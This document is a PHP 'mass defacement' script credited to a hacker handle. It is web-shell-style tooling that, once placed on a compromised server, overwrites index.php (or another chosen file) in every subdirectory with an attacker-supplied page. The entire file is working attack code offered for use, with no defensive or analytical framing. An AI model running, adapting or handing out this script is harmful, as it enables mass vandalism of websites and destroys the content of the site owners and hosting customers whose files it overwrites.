<?php
 
/*
 
Mass Defacement Script By ~RECODED YANZ
 
Contact => http://facebook.com/AnonTeamX.gov
 
*/
 
echo "<title>Mass Defacer - By YANZZ METHOD READ</title>";
echo "<link href='http://fonts.googleapis.com/css?family=Electrolize' rel='stylesheet' type='text/css'>";
echo "<body bgcolor='black'><font color='white'><font face='Electrolize'>";
echo "<center><form method='POST'>";
echo "Base Dir : <input type='text' name='base_dir' size='50' value='".getcwd ()."'><br><br>";
echo "File Name : <input type='text' name='file_name' value='index.php'><br><br>";
echo "file mass : <input type='text' name='defpageD' value='".getcwd ()."'><br><br>";
echo "<input type='submit' value='Start'></form></center>";

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // collect value of input field
    $dir = $_POST['defpageD'];
    if (empty($dir)) {
        echo "tulis dirnya";
    } else {
        echo "File mass picked : $dir";
		echo "
		";
    }
}

if (isset ($_POST['base_dir']))
{
        if (!file_exists ($_POST['base_dir']))
                die ($_POST['base_dir']." Not Found !<br>");
 
        if (!is_dir ($_POST['base_dir']))
                die ($_POST['base_dir']." Is Not A Directory !<br>");
 
        @chdir ($_POST['base_dir']) or die ("Cannot Open Directory");
 
        $files = @scandir ($_POST['base_dir']) or die ("oohhh shet<br>");
		$defpageR = file_get_contents ($dir);
		
	
 
        foreach ($files as $file):
                if ($file != "." && $file != ".." && @filetype ($file) == "dir")
                {
                        $index = getcwd ()."/".$file."/".$_POST['file_name'];
                        if (file_put_contents ($index, $defpageR))
                                echo "$index&nbsp&nbsp&nbsp&nbsp<span style='color: green'>OK</span><br>";
							else 
								echo "$index&nbsp&nbsp&nbsp&nbsp<span style='color: red'>FAILED</span><br>";

                }
        endforeach;
}
 
?>